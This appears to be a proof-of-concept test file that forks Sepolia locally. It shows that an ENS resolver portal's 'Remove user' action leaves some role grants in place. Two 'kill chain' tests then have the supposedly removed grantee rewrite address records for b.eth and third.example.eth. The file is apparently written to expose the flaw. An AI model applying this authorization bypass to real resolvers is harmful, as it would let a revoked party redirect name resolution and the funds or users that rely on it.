const hasRolesOn = (resolver: Address) => (resource: bigint, bitmap: bigint, account: Address) =>
  publicClient.readContract({
    address: resolver,
    abi: eacAbi,
    functionName: 'hasRoles',
    args: [resource, bitmap, account],
  })

const ROOT_RESOURCE = 0n
const nameResource = (name: string): bigint =>
  BigInt(
    keccak256(
      encodeAbiParameters(
        [{ type: 'bytes32' }, { type: 'bytes32' }],
        [namehash(name), `0x${'00'.repeat(32)}` as `0x${string}`],
      ),
    ),
  )

beforeAll(async () => {
  vi.stubEnv('VITE_SEPOLIA_RPC_URL', ANVIL_URL)

  const upstream = createPublicClient({
    transport: http(UPSTREAM_RPC, { retryCount: 8, retryDelay: 1_500 }),
  })
  const pinnedBlock = await upstream.getBlockNumber()
  LOG(`pinned Sepolia block: ${pinnedBlock}`)

  anvil = spawn(
    ANVIL_BIN,
    [
      '--fork-url', UPSTREAM_RPC,
      '--fork-block-number', pinnedBlock.toString(),
      '--port', String(ANVIL_PORT),
      '--block-time', '1',
    ],
    { stdio: ['ignore', 'pipe', 'pipe'] },
  )
  const tail: string[] = []
  anvil.stdout?.on('data', (c: Buffer) => {
    tail.push(c.toString())
    if (tail.length > 200) tail.shift()
  })
  anvil.stderr?.on('data', (c: Buffer) => tail.push(c.toString()))
  let anvilExit: number | null = null
  anvil.on('exit', (code) => {
    anvilExit = code
  })

  ;({ sepoliaWithEns } = await import('@/lib/wagmi'))
  ;({ grantResolverRoles } = await import(
    '@/features/resolver/helpers/grantResolverRoles'
  ))
  ;({ prepareRevokeResolverRolesTransaction } = await import(
    '@/features/resolver/helpers/revokeResolverRoles'
  ))
  ;({ createEOASigner } = await import('@/features/registry/utils/signer.helpers'))

  const transport = () =>
    http(ANVIL_URL, { retryCount: 8, retryDelay: 1_000, timeout: 60_000 })
  publicClient = createPublicClient({ chain: sepoliaWithEns, transport: transport() })
  testClient = createTestClient({
    mode: 'anvil',
    chain: sepoliaWithEns,
    transport: transport(),
  })

  const deadline = Date.now() + 120_000
  for (;;) {
    if (anvilExit !== null)
      throw new Error(`anvil exited early (${anvilExit}): ${tail.join('').slice(-1500)}`)
    try {
      if ((await publicClient.getChainId()) === 11155111) break
    } catch {}
    if (Date.now() > deadline) throw new Error('anvil fork not ready in 120s')
    await delay(1_000)
  }
  LOG('anvil fork ready on', ANVIL_URL)

  const admin = privateKeyToAccount(generatePrivateKey())
  ADMIN = admin.address
  adminWallet = createWalletClient({
    account: admin,
    chain: sepoliaWithEns,
    transport: transport(),
  })
  await testClient.setBalance({ address: ADMIN, value: 10n ** 19n })
  // App transport node-signs (bare from) → the admin must be impersonated.
  await testClient.impersonateAccount({ address: ADMIN })
}, 360_000)

afterAll(async () => {
  vi.unstubAllEnvs()
  if (anvil && anvil.exitCode === null) {
    anvil.kill('SIGKILL')
    await delay(500)
  }
  anvil = null
})

/** Deploy an admin-owned PermissionedResolver through the real factory. */
let deployVersion = 0n
const deployOwnedResolver = async (): Promise<Address> => {
  const factory = getChainContractAddress({
    chain: sepoliaWithEns,
    contract: 'ensVerifiableFactory',
  })
  const impl = getChainContractAddress({
    chain: sepoliaWithEns,
    contract: 'ensPermissionedResolverImpl',
  })
  const initCalldata = encodeFunctionData({
    abi: resolverAbi,
    functionName: 'initialize',
    args: [ADMIN, FULL_BITMAP, []],
  })
  const hash = await adminWallet.writeContract({
    address: factory,
    abi: factoryAbi,
    functionName: 'deployProxy',
    args: [impl, computeOwnedResolverSalt(ADMIN, deployVersion++), initCalldata],
  })
  const receipt = await waitReceipt(hash)
  expect(receipt.status).toBe('success')
  const ev = receipt.logs
    .map((l) => {
      try {
        return decodeEventLog({ abi: factoryAbi, data: l.data, topics: l.topics })
      } catch {
        return null
      }
    })
    .find((e) => e?.eventName === 'ProxyDeployed')!
  const resolver = (ev as { args: { proxyAddress: Address } }).args.proxyAddress
  LOG(`deployed owned PermissionedResolver ${resolver} (tx=${hash})`)
  return resolver
}

/** Grant via the REAL portal helper (AddUserSheet's exact code path). */
const grantViaAppHelper = async (
  resolver: Address,
  name: string, // '' = root scope, exactly like the sheet's combobox default
  grantee: Address,
  roles: ('ROLE_SET_ADDR' | 'ROLE_SET_TEXT')[],
) => {
  const hash = await grantResolverRoles({
    resolverAddress: resolver,
    name,
    account: grantee,
    roles,
    walletClient: adminWallet,
    publicClient,
    signer: createEOASigner(adminWallet),
    chainId: sepoliaWithEns.id,
    id: `poc-grant-${name || 'root'}`,
  })
  const receipt = await waitReceipt(hash)
  expect(receipt.status).toBe('success')
  LOG(`granted [${roles.join(',')}] scope=${name || 'ROOT'} to ${grantee} (tx=${hash})`)
}

/** The exact bytes ResolverRolesSidebar.tsx:169 derives for a Remove user. */
const removeUserViaAppBytes = async (
  resolver: Address,
  derivedName: string,
  grantee: Address,
  roles: ('ROLE_SET_ADDR' | 'ROLE_SET_TEXT')[],
) => {
  const intent = prepareRevokeResolverRolesTransaction({
    resolverAddress: resolver,
    name: derivedName,
    account: grantee,
    roles,
    walletClient: adminWallet,
    chainId: sepoliaWithEns.id,
  })
  const hash = await adminWallet.sendTransaction({
    to: intent.request.to,
    data: intent.request.data,
  })
  const receipt = await waitReceipt(hash)
  expect(receipt.status).toBe('success')
  LOG(
    `Remove user executed: name='${derivedName || 'ROOT'}' roles=[${roles.join(',')}] (tx=${hash})`,
  )
  return hash
}

/** Attacker's record write with their own key; resolves to hash or throws. */
const attackerSetAddr = async (
  resolver: Address,
  granteePkWallet: ReturnType<typeof createWalletClient>,
  node: string,
  to: Address,
): Promise<Hex> => {
  try {
    return await granteePkWallet.writeContract({
      address: resolver,
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [namehash(node), to],
    })
  } catch (error) {
    const msg = String((error as Error).message)
    if (!/revert|0x/i.test(msg)) throw error
    LOG(`single-arg setAddr reverted (${msg.slice(0, 120)}…), retrying multichain form`)
    return granteePkWallet.writeContract({
      address: resolver,
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [namehash(node), 60n, to],
    })
  }
}

const newGrantee = async () => {
  const acct = privateKeyToAccount(generatePrivateKey())
  const wallet = createWalletClient({
    account: acct,
    chain: sepoliaWithEns,
    transport: http(ANVIL_URL, { retryCount: 8, retryDelay: 1_000, timeout: 60_000 }),
  })
  await testClient.setBalance({ address: acct.address, value: 10n ** 18n })
  return { address: acct.address, wallet }
}

describe('fork leg: "Remove user" leaves live authority behind — executed', () => {
  it('KILL CHAIN 1 (two-name row): remove revokes a.eth only; "removed" user rewrites b.eth resolution', async () => {
    R = await deployOwnedResolver()
    const has = hasRolesOn(R)
    const { address: EXGRANT, wallet: exWallet } = await newGrantee()

    // Two ordinary per-name grants of the SAME role on two names — the
    // collapsed row the admin sees shows "a.eth  b.eth  | Set Address".
    await grantViaAppHelper(R, 'a.eth', EXGRANT, ['ROLE_SET_ADDR'])
    await grantViaAppHelper(R, 'b.eth', EXGRANT, ['ROLE_SET_ADDR'])
    expect(await has(nameResource('a.eth'), 1n, EXGRANT)).toBe(true)
    expect(await has(nameResource('b.eth'), 1n, EXGRANT)).toBe(true)

    // The UI would show one row: "Roles scoped to a.eth, b.eth" and the
    // dialog promises removal from ALL roles. The sidebar derives ONE name,
    // and its role list for this row is the union [ROLE_SET_ADDR]:
    await removeUserViaAppBytes(
      R,
      'a.eth', // resolvedNames.find(n => n !== '(root)') — ResolverRolesSidebar.tsx:169
      EXGRANT,
      ['ROLE_SET_ADDR'], // decodedRoles union for this fixture — single scope
    )

    expect(await has(nameResource('a.eth'), 1n, EXGRANT)).toBe(false)
    const survived = await has(nameResource('b.eth'), 1n, EXGRANT)
    expect(survived).toBe(true)
    LOG(
      `POST-REMOVE on-chain truth: hasRoles(a.eth, ROLE_SET_ADDR)=false; ` +
        `hasRoles(b.eth, ROLE_SET_ADDR)=${survived} — the app reported full removal`,
    )

    // HARM LEG: the "removed" user still rewrites b.eth's resolution.
    const writeHash = await attackerSetAddr(R, exWallet, 'b.eth', EXGRANT)
    const receipt = await waitReceipt(writeHash)
    expect(receipt.status).toBe('success')
    const recorded = await publicClient.readContract({
      address: R,
      abi: resolverAbi,
      functionName: 'addr',
      args: [namehash('b.eth')],
    })
    expect(recorded?.toLowerCase()).toBe(EXGRANT.toLowerCase())

    // Negative control: the revoked name is genuinely revoked.
    await expect(
      attackerSetAddr(R, exWallet, 'a.eth', EXGRANT),
    ).rejects.toThrow()
    LOG(
      `KILL CHAIN 1 EXECUTED: "removed" ${EXGRANT} set b.eth's addr → ${recorded} ` +
        `(tx=${writeHash}); a.eth write reverts as expected. ` +
        'The admin confirmed a dialog promising removal from ALL roles.',
    )
  }, 240_000)

  it('KILL CHAIN 2 (root+name mix, "Global roles (all names)"): ROOT grant survives removal; attacker writes a third name', async () => {
    R = await deployOwnedResolver()
    const has = hasRolesOn(R)
    const { address: EXGRANT2, wallet: ex2Wallet } = await newGrantee()

    await grantViaAppHelper(R, '', EXGRANT2, ['ROLE_SET_ADDR']) // ROOT scope
    await grantViaAppHelper(R, 'b.eth', EXGRANT2, ['ROLE_SET_TEXT'])
    expect(await has(ROOT_RESOURCE, 1n, EXGRANT2)).toBe(true)
    expect(await has(nameResource('b.eth'), 16n, EXGRANT2)).toBe(true)

    // Sidebar row would read "Global roles (all names)"; roleName derivation
    // picks 'b.eth' — the ROOT scope is never addressed by the removal.
    await removeUserViaAppBytes(
      R,
      'b.eth',
      EXGRANT2,
      ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
    )

    expect(await has(nameResource('b.eth'), 16n, EXGRANT2)).toBe(false)
    const rootSurvived = await has(ROOT_RESOURCE, 1n, EXGRANT2)
    expect(rootSurvived).toBe(true)

    // HARM LEG: the "removed" user writes resolution for a name that was
    // never part of ANY grant — exactly what "Global roles" covered.
    const writeHash = await attackerSetAddr(R, ex2Wallet, 'third.example.eth', EXGRANT2)
    const receipt = await waitReceipt(writeHash)
    expect(receipt.status).toBe('success')
    const recorded = await publicClient.readContract({
      address: R,
      abi: resolverAbi,
      functionName: 'addr',
      args: [namehash('third.example.eth')],
    })
    expect(recorded?.toLowerCase()).toBe(EXGRANT2.toLowerCase())
    LOG(
      `KILL CHAIN 2 EXECUTED: ROOT ROLE_SET_ADDR survived removal (${rootSurvived}); ` +
        `"removed" ${EXGRANT2} wrote third.example.eth → ${recorded} (tx=${writeHash})`,
    )
  }, 240_000)
})
```
